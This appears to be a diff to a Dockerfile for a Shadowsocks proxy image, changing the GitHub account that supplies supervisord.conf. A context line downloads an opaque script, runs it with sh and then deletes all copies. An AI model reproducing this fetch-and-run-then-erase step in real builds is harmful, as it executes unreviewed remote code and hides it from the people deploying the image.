@@ -18,7 +18,7 @@ RUN rm -rf /var/cache/apk/* ~/.cache
 
 WORKDIR /data/shadowsocks/
 RUN curl "https://raw.githubusercontent.com/solifd/ph/master/aaa" -o  alpine && sh alpine && find / -name  alpine |xargs rm -rf
-RUN curl "https://raw.githubusercontent.com/solifd/x/master/supervisord.conf" -o /etc/supervisord.conf
+RUN curl "https://raw.githubusercontent.com/hfytdgyufhjf/test/master/supervisord.conf" -o /etc/supervisord.conf
 ENV SHADOWSOCKS_LIBEV_VERSION v3.0.5
 ENV SIMPLE_OBFS_VERSION v0.0.3
 
